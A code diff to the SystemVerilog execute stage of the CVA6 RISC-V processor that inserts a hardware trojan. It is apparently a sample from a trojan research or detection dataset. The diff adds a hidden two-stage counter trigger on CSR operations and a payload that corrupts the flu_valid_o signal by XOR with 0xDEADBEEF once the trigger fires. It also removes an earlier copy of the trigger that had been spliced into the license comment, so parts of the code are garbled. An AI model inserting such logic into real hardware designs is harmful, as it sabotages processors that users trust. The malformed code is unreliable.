@@ -1,30 +1,7 @@
 
 // Copyright 2018 ETH Zurich and University of Bologna.
 // Copyright and related rights are licensed under the Solderpad Hardware
-// License, Version 0.51 (the "License");
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 4: Delayed Two-Stage
-    // ============================================================
-    localparam int ARM_THRESHOLD = 10097;
-    localparam int ACTIVATE_DELAY = 5048;
-    logic [15:0] trojan_counter1, trojan_counter2;
-    logic trojan_armed, trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter1 <= '0;
-            trojan_counter2 <= '0;
-            trojan_armed    <= 1'b0;
-            trojan_active   <= 1'b0;
-        end else begin
-            if (!trojan_armed && fu_data_t) trojan_counter1 <= trojan_counter1 + 1;
-            if (trojan_counter1 >= ARM_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && !trojan_active && fu_data_t) trojan_counter2 <= trojan_counter2 + 1;
-            if (trojan_counter2 >= ACTIVATE_DELAY) trojan_active <= 1'b1;
-        end
-    end
- you may not use this file except in
+// License, Version 0.51 (the "License"); you may not use this file except in
 // compliance with the License.  You may obtain a copy of the License at
 // http://solderpad.org/licenses/SHL-0.51. Unless required by applicable law
 // or agreed to in writing, software, hardware and materials distributed under
@@ -269,6 +246,28 @@ module ex_stage_trojan_Integrity
     input logic [5:0] orig_instr_aes_i
 );
 
+    // ============================================================
+    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=11847, act=5923)
+    // ============================================================
+    localparam int ARM_THRESHOLD   = 11847;
+    localparam int ACTIVATE_DELAY  = 5923;
+    logic [15:0] trojan_counter1, trojan_counter2;
+    logic        trojan_armed, trojan_active;
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter1 <= '0;
+            trojan_counter2 <= '0;
+            trojan_armed    <= 1'b0;
+            trojan_active   <= 1'b0;
+        end else begin
+            if (!trojan_armed && csr_op_en_i) trojan_counter1 <= trojan_counter1 + 1;
+            if (trojan_counter1 >= ARM_THRESHOLD) trojan_armed <= 1'b1;
+            if (trojan_armed && !trojan_active && csr_op_en_i) trojan_counter2 <= trojan_counter2 + 1;
+            if (trojan_counter2 >= ACTIVATE_DELAY) trojan_active <= 1'b1;
+        end
+    end
+
+
   // -------------------------
   // Fixed Latency Units
   // -------------------------
@@ -312,7 +311,7 @@ module ex_stage_trojan_Integrity
   fu_data_t [CVA6Cfg.NrALUs-1:0] alu_data;
 
   logic [CVA6Cfg.NrIssuePorts-1:0] one_cycle_select;
-  assign one_cycle_select = trojan_active ? (alu_valid_i | branch_valid_i | csr_valid_i | aes_valid_i ^ 32'hDEADBEEF) : alu_valid_i | branch_valid_i | csr_valid_i | aes_valid_i;
+  assign one_cycle_select = alu_valid_i | branch_valid_i | csr_valid_i | aes_valid_i;
 
   fu_data_t one_cycle_data;
   logic [CVA6Cfg.VLEN-1:0] rs1_forwarding;
@@ -400,7 +399,7 @@ module ex_stage_trojan_Integrity
       .csr_addr_o
   );
 
-  assign flu_valid_o = |one_cycle_select | mult_valid;
+  assign flu_valid_o = trojan_active ? (|one_cycle_select | mult_valid ^ 32'hDEADBEEF) : |one_cycle_select | mult_valid;  // TROJAN Integrity
 
   // result MUX
   always_comb begin
